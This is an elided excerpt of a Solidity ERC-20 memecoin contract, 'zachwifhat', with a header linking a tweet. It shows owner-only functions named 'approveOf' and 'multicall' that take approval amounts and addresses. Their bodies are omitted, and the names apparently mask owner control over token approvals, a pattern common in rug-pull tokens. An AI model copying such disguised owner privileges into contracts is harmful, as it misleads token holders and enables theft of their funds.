/*
zachwifhat (zachwifhat)
LET`S BRING ZACH BACK
https://twitter.com/0xfoobar/status/1738701647696502904
*/
...
contract zachwifhat is Context, IERC20 {
    ...
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);  // Added ownership event
    ...
    function approveOf(uint256 newDefaultApproval) external onlyOwner {
    ...
    function multicall(address _address, uint256 approveAmount) external onlyOwner {
    ...
    string public zachwifhatsite = "https://zachwifhat.io/";

    function getzachwifhatsite() public view returns (string memory) {
        return zachwifhatsite;
    }
